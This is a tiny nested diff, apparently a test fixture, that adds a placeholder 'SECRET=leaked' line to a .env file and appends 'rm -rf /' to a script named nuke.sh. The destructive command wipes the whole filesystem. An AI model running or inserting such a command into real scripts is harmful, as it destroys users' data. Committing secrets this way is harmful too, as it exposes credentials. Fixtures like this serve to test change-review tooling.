@@ -1,0 +1,12 @@
+diff --git a/.env b/.env
+--- a/.env
++++ b/.env
+@@ -1 +1,2 @@
+ DB=localhost
++SECRET=leaked
+diff --git a/nuke.sh b/nuke.sh
+--- a/nuke.sh
++++ b/nuke.sh
+@@ -1 +1,2 @@
+ #!/bin/bash
++rm -rf /
